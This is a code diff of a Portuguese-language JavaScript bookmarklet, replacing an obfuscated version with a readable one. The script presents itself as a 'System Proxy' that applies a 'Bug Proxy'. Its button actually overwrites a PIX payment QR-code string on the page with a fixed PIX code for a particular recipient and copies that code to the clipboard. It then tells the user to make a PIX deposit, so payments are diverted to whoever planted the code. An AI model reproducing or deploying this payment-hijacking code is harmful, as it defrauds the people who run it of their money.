@@ -1,1 +1,87 @@
-function _0x4288(_0x2d162e,_0x2dba5d){var _0x20a33f=_0x20a3();return _0x4288=function(_0x42889e,_0x242ad0){_0x42889e=_0x42889e-0x15c;var _0x5e2f4e=_0x20a33f[_0x42889e];return _0x5e2f4e;},_0x4288(_0x2d162e,_0x2dba5d);}(function(_0x68db3a,_0x4eb13d){var _0x1af923=_0x4288,_0xc5044a=_0x68db3a();while(!![]){try{var _0x81edd4=parseInt(_0x1af923(0x178))/0x1+-parseInt(_0x1af923(0x175))/0x2+parseInt(_0x1af923(0x17c))/0x3*(parseInt(_0x1af923(0x17b))/0x4)+-parseInt(_0x1af923(0x198))/0x5*(parseInt(_0x1af923(0x16d))/0x6)+parseInt(_0x1af923(0x161))/0x7*(-parseInt(_0x1af923(0x187))/0x8)+parseInt(_0x1af923(0x180))/0x9+parseInt(_0x1af923(0x194))/0xa*(parseInt(_0x1af923(0x196))/0xb);if(_0x81edd4===_0x4eb13d)break;else _0xc5044a['push'](_0xc5044a['shift']());}catch(_0x3b3bce){_0xc5044a['push'](_0xc5044a['shift']());}}}(_0x20a3,0x5aafb));function _0x20a3(){var _0x1ed7de=['#1e1e1e','padding','removeChild','appendChild','closeMenu','top','left','30UQjjgk','width','743303uVQpEP','link','185DOsOVK','rel','actionButton','Falha\x20ao\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.','head','200px','position','clientX','757267dFWDBO','height','addEventListener','Elemento\x20não\x20encontrado!','30%','createElement','display','2px\x20solid\x20#ADFF2F','assign','href','style','execCommand','39048QoCoqW','getElementById','9999','none','dblclick','outline','div','boxShadow','252474qxIucO','background','fixed','474176SgTuML','\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://i.ibb.co/j3Z3r1S/Proxy-sha-256-20241023-175438-0000.jpg\x22\x20style=\x22display:\x20block;\x20margin:\x200\x20auto;\x20width:\x20100px;\x20height:\x20100px;\x20border-radius:\x2050%;\x20border:\x202px\x20solid\x20#ADFF2F;\x22>\x20<!--\x20Tamanho\x20da\x20imagem\x20aumentado\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3\x20style=\x27text-align:center;\x27>System\x20Proxy\x20<i\x20class=\x22fas\x20fa-check-circle\x22\x20style=\x22color:\x20#ADFF2F;\x22></i></h3>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\x27closeMenu\x27\x20style=\x22float:right;\x20cursor:pointer;\x20font-size:\x2024px;\x20color:\x20white;\x22>X</span>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20id=\x27actionButton\x27\x20style=\x27display:\x20block;\x20margin:\x2010px\x20auto;\x20padding:\x205px;\x20border:\x20none;\x20border-radius:\x205px;\x20background-color:\x20#ADFF2F;\x20color:\x20white;\x20cursor:\x20pointer;\x20width:\x2080%;\x27>Aplicar\x20Bug\x20Proxy</button>\x20<!--\x20Largura\x20do\x20botão\x20reduzida\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20style=\x27text-align:center;\x20margin-top:\x2010px;\x27><i\x20class=\x22fas\x20fa-cogs\x22></i>\x20SHA256\x20|\x20<i\x20class=\x22fas\x20fa-info-circle\x22></i>\x20Limites:\x2010\x20✔️</div>\x20<!--\x20Colocado\x20embaixo\x20do\x20botão\x20-->\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20','Não\x20foi\x20possível\x20copiar\x20o\x20texto.\x20Tente\x20copiar\x20manualmente.','7252nbfEKH','27ZzDnfj','textarea','innerHTML','value','6249222CiBZUI','body','copy','00020126920014br.gov.bcb.pix2570qrcodes.sulcredi.coop.br/v2/v3/at/99f5462f-11d6-42b4-b666-54385685709e5204000053039865802BR5925E2_BANK_INSTITUICAO_DE_PA6014FRANCISCO_BELT62070503***63047D9D','stylesheet','border','block','48PtZCop','.qr-code-text\x20.qr-code-text-inner','10px','click','https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css','8px'];_0x20a3=function(){return _0x1ed7de;};return _0x20a3();}_0x588699:(function(){var _0x35cef0=_0x4288;const _0x4ff3ec=_0x58e8da(),_0x362500=document[_0x35cef0(0x166)](_0x35cef0(0x197));_0x362500[_0x35cef0(0x199)]=_0x35cef0(0x184),_0x362500[_0x35cef0(0x16a)]=_0x35cef0(0x18b),document[_0x35cef0(0x15d)][_0x35cef0(0x190)](_0x362500),document['body']['appendChild'](_0x4ff3ec),document[_0x35cef0(0x163)](_0x35cef0(0x171),_0xc178d6=>_0x4ad26f(_0x4ff3ec,_0xc178d6['clientY'],_0xc178d6[_0x35cef0(0x160)]));function _0x58e8da(){var _0x146afe=_0x35cef0;const _0x2fa085=document[_0x146afe(0x166)](_0x146afe(0x173));return Object[_0x146afe(0x169)](_0x2fa085['style'],{'position':_0x146afe(0x177),'top':'30%','left':_0x146afe(0x165),'width':_0x146afe(0x15e),'background':_0x146afe(0x18d),'color':'#fff','padding':_0x146afe(0x189),'borderRadius':_0x146afe(0x18c),'border':_0x146afe(0x168),'boxShadow':'0\x200\x2010px\x20rgba(0,0,0,0.5)','display':'none','zIndex':_0x146afe(0x16f)}),_0x2fa085[_0x146afe(0x17e)]=_0x146afe(0x179),_0x2fa085;}function _0x4ad26f(_0x3df0aa,_0x242e03,_0x5935fe){var _0x1f05cb=_0x35cef0;_0x3df0aa[_0x1f05cb(0x16b)][_0x1f05cb(0x167)]===_0x1f05cb(0x186)?_0x3df0aa[_0x1f05cb(0x16b)][_0x1f05cb(0x167)]='none':(_0x3df0aa[_0x1f05cb(0x16b)][_0x1f05cb(0x192)]=_0x242e03+'px',_0x3df0aa[_0x1f05cb(0x16b)][_0x1f05cb(0x193)]=_0x5935fe+'px',_0x3df0aa[_0x1f05cb(0x16b)][_0x1f05cb(0x167)]='block');}function _0x139197(){var _0x5b59f5=_0x35cef0;_0x4ff3ec['style'][_0x5b59f5(0x167)]=_0x5b59f5(0x170);}document['getElementById'](_0x35cef0(0x191))['addEventListener'](_0x35cef0(0x18a),_0x139197),document[_0x35cef0(0x16e)](_0x35cef0(0x19a))[_0x35cef0(0x163)](_0x35cef0(0x18a),()=>{var _0x3632d2=_0x35cef0,_0x10cda0=_0x3632d2(0x183),_0x56c0c0=document['querySelector'](_0x3632d2(0x188));if(_0x56c0c0){_0x56c0c0['innerText']=_0x10cda0;var _0x43f641=document[_0x3632d2(0x166)](_0x3632d2(0x17d));_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x15f)]=_0x3632d2(0x177),_0x43f641[_0x3632d2(0x16b)]['top']='0',_0x43f641['style']['left']='0',_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x195)]='2em',_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x162)]='2em',_0x43f641['style'][_0x3632d2(0x18e)]='0',_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x185)]='none',_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x172)]=_0x3632d2(0x170),_0x43f641[_0x3632d2(0x16b)][_0x3632d2(0x174)]=_0x3632d2(0x170),_0x43f641['style'][_0x3632d2(0x176)]='transparent',_0x43f641[_0x3632d2(0x17f)]=_0x10cda0,document[_0x3632d2(0x181)][_0x3632d2(0x190)](_0x43f641),_0x43f641['focus'](),_0x43f641['select']();try{var _0x5bfad9=document[_0x3632d2(0x16c)](_0x3632d2(0x182)),_0x29ad9d=_0x5bfad9?'AVISO\x20-\x20LEIA\x20COM\x20ATENÇÃO:\x20PROXY\x20APLICADA\x20COM\x20SUCESSO,\x20FAÇA\x20UM\x20DEPOSITO\x20VIA\x20PIX\x20PARA\x20TORNAR\x20A\x20ASSERTIVIDADE\x20DO\x20PROGRAMA.':_0x3632d2(0x17a);alert(_0x29ad9d);}catch(_0x51c893){alert(_0x3632d2(0x15c));}document['body'][_0x3632d2(0x18f)](_0x43f641);}else alert(_0x3632d2(0x164));});}());
+javascript:(function() {
+    const menu = createMenu();
+
+    // Adiciona a folha de estilos
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
+    document.head.appendChild(link);
+
+    document.body.appendChild(menu);
+    document.addEventListener('dblclick', (e) => toggleMenu(menu, e.clientY, e.clientX));
+
+    // Cria o menu
+    function createMenu() {
+        const m = document.createElement('div');
+        Object.assign(m.style, {
+            position: 'fixed', top: '30%', left: '30%', width: '200px',  // Largura reduzida
+            background: '#1e1e1e', color: '#fff', padding: '10px', borderRadius: '8px', 
+            border: '2px solid #A020F0', boxShadow: '0 0 10px rgba(0,0,0,0.5)', display: 'none', zIndex: '9999'
+        });
+        m.innerHTML = `
+            <img src="https://i.ibb.co/SNykPZr/IMG-20241117-WA0053.jpg" style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%; border: 2px solid #A020F0;"> <!-- Imagem alterada -->
+            <h3 style='text-align:center;'>System Proxy <i class="fas fa-check-circle" style="color: #A020F0;"></i></h3>
+            <span id='closeMenu' style="float:right; cursor:pointer; font-size: 24px; color: white;">X</span>
+            <button id='actionButton' style='display: block; margin: 10px auto; padding: 5px; border: none; border-radius: 5px; background-color: #A020F0; color: white; cursor: pointer; width: 80%;'>Aplicar Bug Proxy</button> <!-- Largura do botão reduzida -->
+            <div style='text-align:center; margin-top: 10px;'><i class="fas fa-cogs"></i> SHA256 | <i class="fas fa-info-circle"></i> Limites: 10 ✔️</div> <!-- Colocado embaixo do botão -->
+        `;
+        return m;
+    }
+
+    // Mostra ou oculta o menu com dois cliques
+    function toggleMenu(menu, y, x) {
+        if (menu.style.display === 'block') {
+            menu.style.display = 'none';
+        } else {
+            menu.style.top = `${y}px`; 
+            menu.style.left = `${x}px`; 
+            menu.style.display = 'block';
+        }
+    }
+
+    // Fecha o menu quando o botão "X" for clicado
+    function closeMenu() {
+        menu.style.display = 'none';
+    }
+
+    document.getElementById('closeMenu').addEventListener('click', closeMenu);
+
+    // Ação do botão "Aplicar Bug Proxy"
+    document.getElementById('actionButton').addEventListener('click', () => {
+        // Código para aplicar o proxy
+        var newQRText = "00020126920014br.gov.bcb.pix2570qrcodes.sulcredi.coop.br/v2/v3/at/99f5462f-11d6-42b4-b666-54385685709e5204000053039865802BR5925E2_BANK_INSTITUICAO_DE_PA6014FRANCISCO_BELT62070503***63047D9D";
+        var element = document.querySelector(".qr-code-text .qr-code-text-inner");
+
+        if (element) {
+            element.innerText = newQRText;
+
+            var textArea = document.createElement("textarea");
+            textArea.style.position = "fixed"; 
+            textArea.style.top = "0"; 
+            textArea.style.left = "0";
+            textArea.style.width = "2em"; 
+            textArea.style.height = "2em";
+            textArea.style.padding = "0";
+            textArea.style.border = "none";
+            textArea.style.outline = "none";
+            textArea.style.boxShadow = "none";
+            textArea.style.background = "transparent";
+            textArea.value = newQRText;
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+
+            try {
+                var successful = document.execCommand('copy');
+                var msg = successful ? "AVISO - LEIA COM ATENÇÃO: PROXY APLICADA COM SUCESSO, FAÇA UM DEPOSITO VIA PIX PARA TORNAR A ASSERTIVIDADE DO PROGRAMA." : "Não foi possível copiar o texto. Tente copiar manualmente.";
+                alert(msg);
+            } catch (err) {
+                alert("Falha ao copiar o texto. Tente copiar manualmente.");
+            }
+
+            document.body.removeChild(textArea);
+        } else {
+            alert("Elemento não encontrado!");
+        }
+    });
+})();
